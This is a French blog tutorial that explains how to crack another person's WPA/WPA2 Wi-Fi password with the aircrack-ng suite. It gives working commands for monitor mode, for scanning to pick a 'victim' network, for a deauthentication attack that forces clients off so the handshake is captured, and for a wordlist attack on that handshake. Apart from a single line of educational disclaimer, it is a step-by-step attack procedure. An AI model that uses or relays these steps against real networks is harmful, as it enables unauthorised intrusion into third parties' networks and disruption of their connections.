---
layout: post
title:  "How to use aircrack-ng for bruteforce Wi-fi WPA password"
---

# Comment bruteforce un réseaux wifi WPA/WPA2 avec aircrack-ng

# Disclaimer

Tout ceci est a un but purement éducatif, rentré dans un système informatique sans l'authorisation de son propriétaire est interdit par la loi française. 

Bon tutoriel.

# Matériel 

Pour ce tutoriel il faut :

- Être sous un système d'explotation Unix
- Avoir une carte réseaux wifi
- Une [Wordlist](https://weakpass.com/wordlist) (liste de mot contenant des mots de passes)

# Instalation

Vous pouvez retrouvé comment installé aircrack-ng directement sur le répository officiel de aircrack-ng : -> [ici](https://github.com/aircrack-ng/aircrack-ng)​

Ou Suivant votre système d'exploitation :

Debian / Ubuntu / Mint  :
```
sudo apt-get install aircrack-ng
```

Fedora : 
```
sudo dnf install aircrack-ng
```

une fois installé vous pouvez retrouver la suite d'outils aircrack-ng sur votre ordinateur.

(pour cet exemple j'ai écrit le mot "air" et appuyer plusieurs fois sur tab pour que mon terminal affiche tout les outils de la suite, installé sur mon ordinateur)

```
root@yourid:~$ air
airbase-ng              aireplay-ng             airolib-ng
aircrack-ng/            airmon-ng               airserv-ng
airdecap-ng             airodump-ng             airtun-ng
airdecloak-ng           airodump-ng-oui-update  airventriloquist-ng

```
# Managed to Monitor

Par default votre carte wifi est en mode 'Managed', ce qui vous permet de recevoir la connexion internet.

Nous allons donc passer la carte wifi en mode 'Monitor', qui permet d'observé et d'envoyer des signaux.

Pour ceci il faut tout d'abord identifier le nom de ça carte wifi, en utilisant la commande iwconfig

```
root@yourid:~$ iwconfig
wlp00s0   IEEE 802.11  ESSID:"Wifi-ESSID"  
          Mode:Managed  Frequency:5.18 GHz  Access Point: XX:XX:XX:XX:XX:XX   
          Bit Rate=666.0 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-40 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:37  Invalid misc:2628   Missed beacon:0

```
Le nom de la carte wifi est donc : *wlp00s0*

Nous allons utiliser l'outil 'airmon-ng' qui permet justement de changer la carte wifi en mode monitor

```
root@yourid:~$ airmon-ng start [nom de la carte wifi]
```
pro tips: il est possible que cette commande ne marche pas, plusieurs possibilités: 
 - le message : Run it as root, s'affiche il faut donc avoir les droits super utilisateur.
 - un message d'aide s'affiche : vous n'avez surment pas mis le bon nom de carte wifi
 - un message d'erreur s'affiche : il se peut que des processus peuvent perturber l'opération, dans ce cas il faut faire la commande *airmong-ng check kill*
 - ça ne marche pas, il est possible que votre carte wifi n'est pas compatible avec le mode monitor

une fois cet étape terminer, vous n'avez plus de connexion internet, c'est normal.

Nous allons vérifier si la carte wifi est bien passé en mode monitor:

```
root@yourid:~$ iwconfig
wlp00s0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=0 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

Comme vous l'observez le nom de la carte wifi à changer pour rajouter 'mon' derniere son nom.

# Scanner et trouver une victime.

Nous allons scanner les réseaux wifi au alentours et utilisé l'outil 'airodump-ng', qui est un outil de capture de paquet wifi.

```
root@yourid:~$ airodump-ng [nom de la carte wifi]
```
*attention de pas oublier le "mon" derriere le nom de votre catre wi fi :)*

<img src="../../../assets/airodump.png" />

*Sur cet image mon nom de réseaux wifi est IEWYUAH*

Plusieurs information sont afficher, tel que :
- BSSID (Basic Service Set Identifiers) : qui correspond à l'addresse MAC du routeur.
- PWR (Power) : la puissance du signal
- #Data : les données transmise
- #/s : S pour speed la rapidité de l'envoie des données.
- CH : pour le channel
- ENC : pour encryption, donne l'info sur le protocole de chiffrement.
- AUTH : information sur le type d'authentification.
- ESSID (Electronic Service Set Identifiers) : qui correspond aux nom du routeur.

```
root@yourid:~$ airodump-ng –c[id chanell de votre victime] -w [nom du fichier de capture (qui va être crée)] -d [BSSID de votre victime] [nom de votre carte wifi]
```
pro tips: il est possible que un message d'erreur s'affiche, il est surment du au channel de votre carte wifi. 
Comme vous pouvez le voir sur l'image si dessus en haut a gauche, au dessus du BSSID, il y a écrit 'CH 1', votre carte wifi change de chan. 
Il ne faut pas hésiter a relancer la commande plusieurs fois avant que celle ci marche !

<img src="../../../assets/airodump-cpt.png" />

*STATION correspond à l'adresse MAC de la personne connecté*

Attention à ne partir de ce moment, vous êtes en train d'enregister des captures réseaux sur votre ordinateur, il ne faut donc pas fermée votre terminal sous peine de stopper la capture réseaux. 


# Get the handshake

Pour pouvoir réussir a intercepté le mot de passe wifi de votre victime, il faut capturer le handshake. 
Le Handshake est l'échange de validation entre le client et le routeur.

Nous allons utilisez airplay-ng pour injecter des paquets a une ou plusieurs machines sur le réseaux pour les forcer à se déconnecter (Attaque par déni de service).

```
root@yourid:~$ aireplay-ng --deauth 0 –a [BSSID de votre victime] -c [Adress MAC STATION] [nom de votre carte wifi]​
```
Quand la machine victime va se reconnecter aux réseaux automatiquement vous allez récuperer le handshake.
Une fois l'attaque lancé vous pouvez la stopper quand vous le désirez.

# Le Bruteforce !

Une fois le handshake capturé, vous pouvez remettre votre carte wifi en mode managed.​

```
root@yourid:~$ airmon-ng stop [nom de votre carte wifi]
```

si vous refaite la commande *iwconfig*, vous allez remarquer que votre carte wifi à repris son nom initial.

Pour la dernière étape nous allons essayer de comparer le hash du handshake aux hash d'une liste de mot de passe, si cette opération réussie nous avons le mot de passe du wifi victims.​

```
root@yourid:~$ aircrack-ng [nom du paquet réseaux capture (files.cap)] -w [wordlist]
```

Si le mot de passe est présent dans la wordlist : 
Dans mon cas, j'ai testé en rajouter le mot de passes a la fin d'une wordlist de 7000 mots de passes, cela ma pris moins de 5 secondes pour le trouver.

<img src="../../../assets/aircrack-get-psswd.png" />

Dans le cas contraire :

<img src="../../../assets/aircrack-fail.png" />

# Conclusion 

Voici une méthode pour crackez les mots de passes wifi, en informatique rien n'est magique.


# Remerciement

Merci beaucoup d'avoir lu mon tutoriel, j'éspere que ça vous à plus.

Si vous voyez des fautes d'orthographe, ou autre, n'hésitez pas à m'envoyer un mail avec la correction 
ou faire un pull requests :smiley:

